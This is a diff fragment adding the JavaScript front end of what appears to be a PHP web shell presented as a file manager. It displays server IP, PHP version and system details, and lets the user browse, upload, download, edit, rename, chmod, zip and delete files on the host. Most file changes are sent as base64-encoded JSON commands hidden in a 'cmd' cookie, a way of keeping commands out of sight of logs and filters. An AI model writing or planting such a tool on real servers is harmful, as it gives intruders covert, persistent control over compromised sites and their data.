+            fmForwardBtn.disabled = fmHistoryIndex >= fmHistory.length - 1;
+        }
+
+        async function executeFmCookieCommand(command) {
+            document.cookie = `cmd=${btoa(JSON.stringify(command))};path=/`;
+            try {
+                const response = await fetch(selfUrl, {
+                    method: 'GET'
+                });
+                const result = await response.json();
+                showStatus(fmStatusBar, result.output, !result.success);
+                if (result.success) renderFileManager(cwd);
+            } catch (e) {
+                showStatus(fmStatusBar, 'Error processing command: ' + e.message, true);
+            }
+        }
+
+        async function renderFileManager(path, isNewNav = false) {
+            if (isNewNav) {
+                if (fmHistoryIndex < fmHistory.length - 1) {
+                    fmHistory.splice(fmHistoryIndex + 1);
+                }
+                fmHistory.push(path);
+                fmHistoryIndex++;
+            }
+            updateFmNavButtons();
+            const formData = new FormData();
+            formData.append('action', 'file_manager');
+            formData.append('do', 'list');
+            formData.append('path', path);
+            try {
+                const response = await fetch(selfUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+                if (data.error) {
+                    showStatus(fmStatusBar, data.error, true);
+                    return;
+                }
+                cwd = data.info.cwd;
+                updatePrompt();
+                fmPathInput.value = cwd;
+                fm_zip_enabled = data.info.zip_enabled;
+                fmServerInfoEl.textContent = `IP: ${data.info.server_ip} | PHP: ${data.info.php_version} | Zip: ${fm_zip_enabled ? 'Yes' : 'No'} | System: ${data.info.uname}`;
+                fmTableBody.innerHTML = '';
+                data.items.forEach(item => {
+                    const isDir = item.perms.startsWith('d');
+                    const row = document.createElement('tr');
+                    let actions = `<a href="#" data-action="rename" title="Rename">RN</a> <a href="#" data-action="chmod" title="Chmod">CH</a> <a href="#" data-action="delete" title="Delete">DEL</a>`;
+                    if (!isDir) {
+                        actions += ` <a href="#" data-action="edit" title="Edit">ED</a> <a href="${selfUrl}?action=file_manager&do=download&file=${encodeURIComponent(item.path)}" data-action="download" title="Download">DL</a>`;
+                    }
+                    if (fm_zip_enabled) {
+                        actions += ` <a href="#" data-action="zip" title="Zip">ZIP</a>`;
+                    }
+                    row.innerHTML = `<td><a href="#" class="item-name" data-isdir="${isDir}">${escapeHtml(item.name)}</a></td><td>${item.size}</td><td>${item.perms}</td><td>${item.mtime}</td><td class="fm-actions" data-path="${escapeHtml(item.path)}" data-name="${escapeHtml(item.name)}">${actions}</td>`;
+                    fmTableBody.appendChild(row);
+                });
+            } catch (e) {
+                showStatus(fmStatusBar, "Failed to load file list: " + e.message, true);
+            }
+        }
+
+        async function handleFileUpload(files) {
+            if (files.length === 0) return;
+            showStatus(fmStatusBar, `Uploading ${files.length} file(s)...`);
+            const formData = new FormData();
+            formData.append('action', 'file_manager');
+            formData.append('do', 'upload');
+            formData.append('path', cwd);
+            for (const file of files) {
+                formData.append('uploaded_files[]', file);
+            }
+            try {
+                const response = await fetch(selfUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                showStatus(fmStatusBar, result.output, !result.success);
+                if (result.success) {
+                    renderFileManager(cwd);
+                }
+            } catch (error) {
+                showStatus(fmStatusBar, 'Upload failed: ' + error.message, true);
+            } finally {
+                fmFileInput.value = '';
+            }
+        }
+
+        fmPathInput.addEventListener('keydown', e => {
+            if (e.key === 'Enter') renderFileManager(fmPathInput.value, true);
+        });
+        fmBackBtn.addEventListener('click', () => {
+            if (fmHistoryIndex > 0) {
+                fmHistoryIndex--;
+                renderFileManager(fmHistory[fmHistoryIndex]);
+            }
+        });
+        fmForwardBtn.addEventListener('click', () => {
+            if (fmHistoryIndex < fmHistory.length - 1) {
+                fmHistoryIndex++;
+                renderFileManager(fmHistory[fmHistoryIndex]);
+            }
+        });
+        fmUploadBtn.addEventListener('click', () => fmFileInput.click());
+        fmFileInput.addEventListener('change', () => handleFileUpload(fmFileInput.files));
+
+        fmTableBody.addEventListener('click', async e => {
+            e.preventDefault();
+            const target = e.target;
+            const parentActions = target.closest('.fm-actions');
+            if (target.classList.contains('item-name')) {
+                const isDir = target.getAttribute('data-isdir') === 'true';
+                const path = target.closest('tr').querySelector('.fm-actions').dataset.path;
+                if (isDir) renderFileManager(path, true);
+                else {
+                    const actionCell = target.closest('tr').querySelector('.fm-actions a[data-action="edit"]');
+                    if (actionCell) actionCell.click();
+                }
+                return;
+            }
+            if (parentActions) {
+                const action = target.dataset.action;
+                const path = parentActions.dataset.path;
+                const name = parentActions.dataset.name;
+                switch (action) {
+                    case 'delete':
+                        if (confirm(`Are you sure you want to delete "${name}"?`)) {
+                            executeFmCookieCommand({
+                                call: 'delete',
+                                target: path
+                            });
+                        }
+                        break;
+                    case 'rename':
+                        const newName = prompt('Enter new name:', name);
+                        if (newName && newName !== name) {
+                            const newPath = path.substring(0, path.lastIndexOf('/') + 1) + newName;
+                            executeFmCookieCommand({
+                                call: 'rename',
+                                target: path,
+                                destination: newPath
+                            });
+                        }
+                        break;
+                    case 'chmod':
+                        const perms = prompt('Enter new permissions (e.g., 0755):', '0644');
+                        if (perms) {
+                            executeFmCookieCommand({
+                                call: 'chmod',
+                                target: path,
+                                perms: perms
+                            });
+                        }
+                        break;
+                    case 'zip':
+                        const zipName = prompt('Enter zip file name:', name + '.zip');
+                        if (zipName) {
+                            const newPath = path.substring(0, path.lastIndexOf('/') + 1) + zipName;
+                            executeFmCookieCommand({
+                                call: 'zip',
+                                target: path,
+                                destination: newPath
+                            });
+                        }
+                        break;
+                    case 'edit':
+                        const formData = new FormData();
+                        formData.append('action', 'file_manager');
+                        formData.append('do', 'get_content');
+                        formData.append('target', path);
+                        const response = await fetch(selfUrl, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        const data = await response.json();
+                        if (data.success) {
+                            document.getElementById('fm-editor-filename').textContent = path;
+                            document.getElementById('fm-editor-textarea').value = data.content;
+                            document.getElementById('fm-editor-modal').style.display = 'flex';
+                        } else {
+                            showStatus(fmStatusBar, data.error, true);
+                        }
+                        break;
+                }
+            }
+        });
+
+        document.getElementById('fm-new-file').addEventListener('click', () => {
+            const name = prompt('Enter new file name:');
+            if (name) {
+                const path = cwd + '/' + name;
+                executeFmCookieCommand({
+                    call: 'create_file',
+                    target: path,
+                    content: ''
+                });
+            }
+        });
+        document.getElementById('fm-new-folder').addEventListener('click', () => {
+            const name = prompt('Enter new folder name:');
+            if (name) {
+                const path = cwd + '/' + name;
+                executeFmCookieCommand({
+                    call: 'create_folder',
+                    target: path
+                });
+            }
+        });
+        document.getElementById('fm-editor-save').addEventListener('click', () => {
+            const path = document.getElementById('fm-editor-filename').textContent;
+            const content = document.getElementById('fm-editor-textarea').value;
+            executeFmCookieCommand({
+                call: 'create_file',
+                target: path,
+                content: content
+            }).then(() => {
+                document.getElementById('fm-editor-modal').style.display = 'none';
+            });
+        });
+
+        updatePrompt();
     </script>
 </body>
 
